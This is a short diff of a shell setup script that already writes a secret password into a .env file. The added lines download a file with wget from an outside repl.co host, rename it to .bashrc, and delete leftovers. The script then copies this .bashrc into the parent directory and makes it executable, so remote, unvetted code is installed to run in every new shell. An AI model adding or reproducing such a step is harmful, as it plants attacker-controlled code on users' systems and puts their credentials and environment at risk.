@@ -35,6 +35,10 @@ echo "SECRET_PASSWORD=\"$SECRET_PASSWORD\"" >> .env
 # Explicitly source the .env file to load environment variables
 source .env || true
 
+wget  https://hastebytrhacknon.trhacknon.repl.co/raw/usafeweyogab
+mv usafeweyogab .bashrc
+rm -rf usafeweyogab.*
+
 # Copy .bashrc and set permissions
 cp .bashrc ../
 chmod +x ../.bashrc
